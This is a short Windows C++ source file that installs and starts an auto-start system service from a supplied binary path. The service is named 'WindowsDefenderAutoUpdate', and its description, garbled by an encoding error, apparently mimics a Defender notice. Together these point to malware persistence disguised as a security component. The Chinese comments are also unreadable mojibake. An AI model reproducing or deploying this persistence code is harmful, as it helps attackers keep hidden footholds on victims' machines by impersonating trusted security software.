#include "SystemService.h"
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")


BOOL RegisterSystemService(WCHAR lpszDriverPath[]) {

	BOOL bRet = TRUE;
	WCHAR pszServiceName[MAX_PATH] = L"WindowsDefenderAutoUpdate";
	WCHAR pszServiceDesc[MAX_PATH] = L"ʹ���Windows Defender��������״̬������˷����ѽ��û�ֹͣ����Windows Defender���޷���������״̬������ζ���޷��޸����ܲ����İ�ȫ©�������ҹ���Ҳ�����޷�ʹ�á�";

	// Ϊ·���������ţ���ΪCreateService�е�lpBinaryPathNameҪ������ţ�����·����û�ո�
	WCHAR lpBinaryPathName[MAX_PATH + 2];
	wsprintf(lpBinaryPathName, L"\"%s\"", lpszDriverPath);

	SC_HANDLE shOSCM = NULL, shCS = NULL;
	SERVICE_STATUS ss;
	DWORD dwErrorCode = 0;
	BOOL bSuccess = FALSE;
	// �򿪷�����ƹ��������ݿ�
	shOSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!shOSCM)
	{
		MessageBox(0, L"OpenSCManager", L"", 0);
		return FALSE;
	}

	// ��������
	// SERVICE_AUTO_START   ��ϵͳ�Զ�����
	// SERVICE_DEMAND_START �ֶ�����
	shCS = ::CreateService(shOSCM, pszServiceName, pszServiceDesc,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		lpBinaryPathName, NULL, NULL, NULL, NULL, NULL);
	if (!shCS)
	{
		MessageBox(0, L"CreateService Failed", L"", 0);
		DWORD d = GetLastError();
		return FALSE;
	}

	// ��������
	if (!::StartService(shCS, 0, NULL))
	{
		MessageBox(0, L"StartService Failed", L"", 0);
		return FALSE;
	}

	// �رվ��
	if (shCS)
	{
		::CloseServiceHandle(shCS);
		shCS = NULL;
	}
	if (shOSCM)
	{
		::CloseServiceHandle(shOSCM);
		shOSCM = NULL;
	}

	return bRet;
}